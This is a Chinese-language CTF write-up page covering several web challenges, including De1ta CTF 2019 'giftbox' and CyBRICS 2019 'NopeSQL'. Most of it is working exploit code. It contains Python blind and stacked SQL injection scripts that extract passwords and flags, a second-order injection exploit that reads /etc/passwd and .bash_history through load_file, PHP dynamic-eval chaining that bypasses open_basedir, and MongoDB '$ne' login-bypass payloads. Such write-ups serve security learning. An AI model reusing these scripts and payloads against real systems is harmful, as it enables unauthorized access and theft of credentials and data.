<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line"><span class="comment">#  select case when 1=0 then (exp(~(select 1))) else 1 end;</span></span><br><span class="line"><span class="comment">#  ';set/**/@a=0x73656c6563742063617365207768656e20313d31207468656e2028657870287e2873656c656374203129292920656c7365203120656e643b;prepare/**/kk/**/from/**/@a;execute/**/kk;</span></span><br><span class="line">a = <span class="string">"select case when 1=0 then (exp(~(select 1))) else 1 end;"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(query)</span>:</span></span><br><span class="line">    hex_str = hex(bytes_to_long(query))[:<span class="number">-1</span>]</span><br><span class="line">    stack = <span class="string">"""';set/**/@a=&#123;0&#125;;prepare/**/kk/**/from/**/@a;execute/**/kk;"""</span>.format(hex_str)</span><br><span class="line">    <span class="keyword">return</span> stack</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(stack)</span>:</span></span><br><span class="line">    json_str = &#123;</span><br><span class="line">        <span class="string">"username"</span>:stack,</span><br><span class="line">        <span class="string">"password"</span>:<span class="string">"gg"</span></span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>&#125;</span><br><span class="line">    url = <span class="string">"http://182.92.220.157:11116/index.php?r=Login/Login"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.post(url, data=json.dumps(json_str), headers=headers,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="comment">#  print res.content</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    l_bound = <span class="number">0</span>;h_bound = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> l_bound&lt;=h_bound:</span><br><span class="line">        m_bound = (l_bound + h_bound) / <span class="number">2</span></span><br><span class="line">        <span class="comment">#  query = "select case when ord(substr((select/**/version()),&#123;0&#125;,1))&gt;&#123;1&#125; then (exp(~(select 1))) else 1 end;".format(index, m_bound)</span></span><br><span class="line">        <span class="comment">#  query = "select case when ord(substr((select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns/**/where/**/table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125; then (exp(~(select 1))) else 1 end;".format(index, m_bound)</span></span><br><span class="line">        <span class="comment">#  query = "select case when ord(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'),&#123;0&#125;,1))&gt;&#123;1&#125; then (exp(~(select 1))) else 1 end;".format(index, m_bound)</span></span><br><span class="line">        query = <span class="string">"select case when ord(substr((select/**/group_concat(flag)/**/from/**/flag),&#123;0&#125;,1))&gt;&#123;1&#125; then (exp(~(select 1))) else 1 end;"</span>.format(index, m_bound)</span><br><span class="line">        <span class="comment">#  query = "select case when ord(substr((select 'hello'),&#123;0&#125;,1))&gt;&#123;1&#125; then (exp(~(select 1))) else 1 end;".format(index, m_bound)</span></span><br><span class="line">        <span class="comment">#  print query</span></span><br><span class="line">        stack = generate(query)</span><br><span class="line">        a = send(stack)</span><br><span class="line">        <span class="comment">#  exit(0)</span></span><br><span class="line">        <span class="keyword">if</span> a:</span><br><span class="line">            l_bound = m_bound + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            h_bound = m_bound - <span class="number">1</span></span><br><span class="line">            temp = m_bound</span><br><span class="line"></span><br><span class="line">    result += chr(temp)</span><br><span class="line">    index = index + <span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> result</span><br></pre></td></tr></table></figure>
<p>注入出来一个zip的路径, 获取它之后开始审计代码, 发现extract函数处有变量覆盖漏洞</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70391962-95517380-1a15-11ea-8b9f-7e1d76a23770.png" alt="image"></p>
<p>出来的base64进行一个解码就有flag了</p>
<h2 id="Comment">Comment</h2>
<p>使用这个工具https://github.com/gakki429/Git_Extract 将远程环境中的.git中的对象还原出来, 普通的githack做不到这一点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>category变量在插入之后如果触发了comment功能就会再次提取出来并不做任何处理重新插入新的表中, 那么可以考虑二次注入了(发现很多和插入相关的功能都和二次注入相关)</p>
<p>然后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$sql = &quot;insert into comment</span><br><span class="line">        set category = &apos;$category&apos;,</span><br><span class="line">            content = &apos;$content&apos;,</span><br><span class="line">            bo_id = &apos;$bo_id&apos;&quot;;</span><br></pre></td></tr></table></figure>
<p>这种多行的就可以避免注释符号破坏整体结构.于是exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://10a319be-9667-4c10-94ca-bdc272ca247f.node3.buuoj.cn"</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ran_str</span><span class="params">()</span>:</span></span><br><span class="line">    string = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        string += chr(random.randint(ord(<span class="string">'A'</span>), ord(<span class="string">'Z'</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"username"</span>: <span class="string">"zhangwei"</span>,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"zhangwei666"</span></span><br><span class="line">    &#125;</span><br><span class="line">    s.post(url + <span class="string">"/login.php"</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(payload)</span>:</span></span><br><span class="line">    ran_string = ran_str()</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'title'</span>: ran_string,</span><br><span class="line">        <span class="string">'category'</span>: <span class="string">"',content=("</span>+payload+<span class="string">"),/*"</span>,</span><br><span class="line">        <span class="string">'content'</span>: <span class="string">'1'</span></span><br><span class="line">    &#125;</span><br><span class="line">    s.post(url + <span class="string">"/write_do.php?do=write"</span>, data=data)</span><br><span class="line">    <span class="keyword">return</span> ran_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment</span><span class="params">(id)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'content'</span>: <span class="string">"*/#"</span>,</span><br><span class="line">        <span class="string">'bo_id'</span>: id</span><br><span class="line">    &#125;</span><br><span class="line">    s.post(url + <span class="string">"/write_do.php?do=comment"</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 读取用户</span></span><br><span class="line">    <span class="comment">#  payload = "select (load_file('/etc/passwd'))"</span></span><br><span class="line">    <span class="comment"># 读取用户目录下的操作历史</span></span><br><span class="line">    <span class="comment"># payload = "select (load_file('/home/www/.bash_history'))"</span></span><br><span class="line">    <span class="comment"># 从操作历史中知道了这么个文件</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># payload = "select (load_file('/tmp/html/.DS_Store'))"</span></span><br><span class="line">    <span class="comment">#  payload = "select (load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    login()</span><br><span class="line">    ran_string = write(payload)</span><br><span class="line">    result = re.search(<span class="string">"&lt;tr&gt;&lt;td&gt;.*&lt;/td&gt;&lt;td class='AutoNewline'&gt;.*&lt;/td&gt;&lt;td class='AutoNewline'&gt;"</span>+ran_string+<span class="string">"&lt;/td&gt;"</span>, s.get(url).text)</span><br><span class="line">    id = str(result.group(<span class="number">0</span>).split(<span class="string">'&lt;/td&gt;'</span>)[<span class="number">0</span>][<span class="number">8</span>:])</span><br><span class="line">    comment(id)</span><br><span class="line">    result = re.split(<span class="string">"&lt;p&gt;"</span>, s.get(url + <span class="string">"/comment.php?id="</span> + str(id)).text)[<span class="number">2</span>]</span><br><span class="line">    content = result[:result.index(<span class="string">'&lt;/p&gt;'</span>)]</span><br><span class="line">    print(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="De1ta-ctf-2019-giftbox">De1ta ctf 2019 giftbox</h2>
<p>打开后是一个漂亮的沙盒</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70123884-86ce2980-16ae-11ea-83e0-367a142a00ad.png" alt="image"></p>
<p>打开main.js后提示使用pyotp库, 是一个一次一密的的东西, 还给了初始化的密钥, 然后初始化pyotp类之后通过时间产生密钥.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">       url: host + &apos;/shell.php?a=&apos;+encodeURIComponent(input)+&apos;&amp;totp=&apos; + new TOTP(&quot;GAXG24JTMZXGKZBU&quot;,8).genOTP(),</span><br><span class="line">       type: &quot;GET&quot;,</span><br><span class="line">       dataType: &apos;json&apos;,</span><br><span class="line">       success: (res) =&gt; &#123;</span><br><span class="line">           e_main.html($(&apos;#main&apos;).html() + &apos;[&lt;span id=&quot;usr&quot;&gt;&apos; + usrName + &apos;&lt;/span&gt;@&lt;span class=&quot;host&quot;&gt;de1ta-mbp&lt;/span&gt; &apos; + position + &apos;]% &apos; + input + &apos;&lt;br/&gt;&apos; + res.message + &apos;&lt;br/&gt;&apos;)</span><br><span class="line">           if (e_console.height()-$(window).height()&gt;0)&#123;e_console.css(&apos;top&apos;,-(e_console.height()-$(window).height()));&#125;else&#123;e_console.css(&apos;top&apos;,5);&#125;</span><br><span class="line">       &#125;,</span><br><span class="line">       error: (res) =&gt; &#123;</span><br><span class="line">           e_main.html($(&apos;#main&apos;).html() + &apos;[&lt;span id=&quot;usr&quot;&gt;&apos; + usrName + &apos;&lt;/span&gt;@&lt;span class=&quot;host&quot;&gt;de1ta-mbp&lt;/span&gt; &apos; + position + &apos;]% &apos; + input + &apos;&lt;br/&gt;System Fatal Error!&lt;br/&gt;&apos;)</span><br><span class="line">           if (e_console.height()-$(window).height()&gt;0)&#123;e_console.css(&apos;top&apos;,-(e_console.height()-$(window).height()));&#125;else&#123;e_console.css(&apos;top&apos;,5);&#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;)</span><br></pre></td></tr></table></figure>
<p>登录处注入脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://6902525d-08c5-4464-9537-eec6f904fc0a.node3.buuoj.cn/shell.php?a=%s&amp;totp=%s'</span></span><br><span class="line">totp = pyotp.TOTP(<span class="string">"GAXG24JTMZXGKZBU"</span>, digits=<span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">length = <span class="number">0</span></span><br><span class="line">left = <span class="number">0x0</span></span><br><span class="line">right = <span class="number">0xff</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    mid = int((right - left) / <span class="number">2</span> + left)</span><br><span class="line">    <span class="keyword">if</span> mid == left:</span><br><span class="line">        length = mid</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    username = <span class="string">"'/**/or/**/if(length((select/**/password/**/from/**/users/**/limit/**/1))&gt;=%d,1,0)#"</span> % mid</span><br><span class="line">    password = <span class="string">"b"</span></span><br><span class="line">    payload = <span class="string">'login %s %s'</span> % (username, password)</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    res = s.get(payload).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'incorrect'</span> <span class="keyword">in</span> res:</span><br><span class="line">        left = mid</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        right = mid</span><br><span class="line">print(length)</span><br><span class="line"></span><br><span class="line">real_password = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    left = <span class="number">0x20</span></span><br><span class="line">    right = <span class="number">0x7e</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mid = int((right - left) / <span class="number">2</span> + left)</span><br><span class="line">        <span class="keyword">if</span> mid == left:</span><br><span class="line">            real_password += chr(mid)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        username = <span class="string">"'/**/or/**/if(ascii(substr((select/**/password/**/from/**/users/**/limit/**/1),%d,1))&gt;=%d,1,0)#"</span> % (i, mid)</span><br><span class="line">        password = <span class="string">"b"</span></span><br><span class="line">        payload = <span class="string">'login %s %s'</span> % (username, password)</span><br><span class="line">        payload = urllib.quote(payload)</span><br><span class="line">        payload = url % (payload, totp.now())</span><br><span class="line">        res = s.get(payload).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'incorrect'</span> <span class="keyword">in</span> res:</span><br><span class="line">            left = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">    print(real_password)</span><br><span class="line">    <span class="keyword">if</span> len(real_password) &lt; i:</span><br><span class="line">        print(<span class="string">'No.%d char not in range'</span> % i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>得到了<code>hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</code></p>
<p>然后<code>login admin hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333} </code>来登录用户, 并且这里提示了一个命令, 执行一下sh0w_hiiintttt_23333 后提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">we add an evil monster named &apos;eval&apos; when launching missiles.</span><br></pre></td></tr></table></figure>
<p>其实是在提示php的动态执行特性</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://6902525d-08c5-4464-9537-eec6f904fc0a.node3.buuoj.cn/shell.php?a=%s&amp;totp=%s'</span></span><br><span class="line">totp = pyotp.TOTP(<span class="string">"GAXG24JTMZXGKZBU"</span>, digits=<span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(password)</span>:</span></span><br><span class="line">    username = <span class="string">'admin'</span></span><br><span class="line">    payload = <span class="string">'login %s %s'</span> % (username, password)</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destruct</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">'destruct'</span></span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">targeting</span><span class="params">(code, position)</span>:</span></span><br><span class="line">    payload = <span class="string">'targeting %s %s'</span> % (code, position)</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launch</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">'launch'</span></span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    <span class="keyword">return</span> s.get(payload).text</span><br><span class="line"></span><br><span class="line">login(<span class="string">'hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;'</span>)</span><br><span class="line">destruct()</span><br><span class="line">targeting(<span class="string">'a'</span>,<span class="string">'chr'</span>)</span><br><span class="line">targeting(<span class="string">'b'</span>,<span class="string">'&#123;$a(46)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'c'</span>,<span class="string">'&#123;$b&#125;&#123;$b&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'d'</span>,<span class="string">'&#123;$a(47)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'e'</span>,<span class="string">'js'</span>)</span><br><span class="line">targeting(<span class="string">'f'</span>,<span class="string">'open_basedir'</span>)</span><br><span class="line">targeting(<span class="string">'g'</span>,<span class="string">'chdir'</span>)</span><br><span class="line">targeting(<span class="string">'h'</span>,<span class="string">'ini_set'</span>)</span><br><span class="line">targeting(<span class="string">'i'</span>,<span class="string">'file_get_'</span>)</span><br><span class="line">targeting(<span class="string">'j'</span>,<span class="string">'&#123;$i&#125;contents'</span>)</span><br><span class="line">targeting(<span class="string">'k'</span>,<span class="string">'&#123;$g($e)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'l'</span>,<span class="string">'&#123;$h($f,$c)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'m'</span>,<span class="string">'&#123;$g($c)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'n'</span>,<span class="string">'&#123;$h($f,$d)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'o'</span>,<span class="string">'&#123;$d&#125;flag'</span>)</span><br><span class="line">targeting(<span class="string">'p'</span>,<span class="string">'&#123;$j($o)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'q'</span>,<span class="string">'printf'</span>)</span><br><span class="line">targeting(<span class="string">'r'</span>,<span class="string">'&#123;$q($p)&#125;'</span>)</span><br><span class="line">print(launch())</span><br></pre></td></tr></table></figure>
<h2 id="CyBRICS-CTF-2019-NopeSQL">CyBRICS CTF 2019 NopeSQL</h2>
<blockquote>
<p>这道题考察mongodb注入,学到很多,复现的时候由于不会搭建环境导致都是看着payload和文档来想象解析过程的.很是菜鸡.</p>
</blockquote>
<p>开局的界面,看起来那个是登录用的框框,下面的新闻估计是随机生成的不知道啥意思.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61634032-fd035e00-acc2-11e9-8eaf-a6ff3a9fb412.png" alt="image"></p>
<p>首先发现<code>.git</code>源码泄露,如下所示:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">"/vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">    $document = $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($document) &amp;&amp; <span class="keyword">isset</span>($document-&gt;password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_COOKIE[<span class="string">'username'</span>], $_COOKIE[<span class="string">'password'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($user) &#123;</span><br><span class="line">        setcookie(<span class="string">'username'</span>, $_POST[<span class="string">'username'</span>]);</span><br><span class="line">        setcookie(<span class="string">'password'</span>, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($user == <span class="keyword">true</span>): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    Welcome!</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        Group most common news by</span><br><span class="line">        &lt;a href=<span class="string">"?filter=$category"</span>&gt;category&lt;/a&gt; | </span><br><span class="line">        &lt;a href=<span class="string">"?filter=$public"</span>&gt;publicity&lt;/a&gt;&lt;br&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $filter = $_GET[<span class="string">'filter'</span>];</span><br><span class="line"></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">        $pipeline = [</span><br><span class="line">            [<span class="string">'$group'</span> =&gt; [<span class="string">'_id'</span> =&gt; <span class="string">'$category'</span>, <span class="string">'count'</span> =&gt; [<span class="string">'$sum'</span> =&gt; <span class="number">1</span>]]],</span><br><span class="line">            [<span class="string">'$sort'</span> =&gt; [<span class="string">'count'</span> =&gt; <span class="number">-1</span>]],</span><br><span class="line">            [<span class="string">'$limit'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $filters = [</span><br><span class="line">            [<span class="string">'$project'</span> =&gt; [<span class="string">'category'</span> =&gt; $filter]]</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line">	</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($filter)): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $category) &#123;</span><br><span class="line">                    printf(<span class="string">"%s has %d news&lt;br&gt;"</span>, $category[<span class="string">'_id'</span>], $category[<span class="string">'count'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])): <span class="meta">?&gt;</span></span><br><span class="line">        Invalid username <span class="keyword">or</span> password</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;form action=<span class="string">'/'</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h2&gt;News&lt;/h2&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line">        $cursor = $collection-&gt;find([<span class="string">'public'</span> =&gt; <span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $news) &#123;</span><br><span class="line">            printf(<span class="string">"%s&lt;br&gt;"</span>, $news[<span class="string">'title'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看出来这是一个mongodb的注入题目,问题分为两个部分,首先是登录,这个好办,比赛的时候是构造下面的载荷来登录的(现在回头一看好多冗余.比赛的时候脑子不开窍啊…orz)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=&quot;,&quot;username&quot;:&#123;&quot;any&quot;:&quot;</span><br><span class="line">password=&quot;&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;:&quot;dd&quot;&#125;,&quot;username&quot;:&quot;admin</span><br></pre></td></tr></table></figure>
<p>看一看大佬的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户名：随便</span><br><span class="line">密码：&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;: null&#125;,&quot;username&quot;:&quot;admin</span><br></pre></td></tr></table></figure>
<p>然后界面就是这样的了:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61634710-7b143480-acc4-11e9-8a71-2458db059585.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61634735-89fae700-acc4-11e9-930c-0c990671b453.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61634744-91ba8b80-acc4-11e9-88ff-60e14a675ad0.png" alt="image"></p>
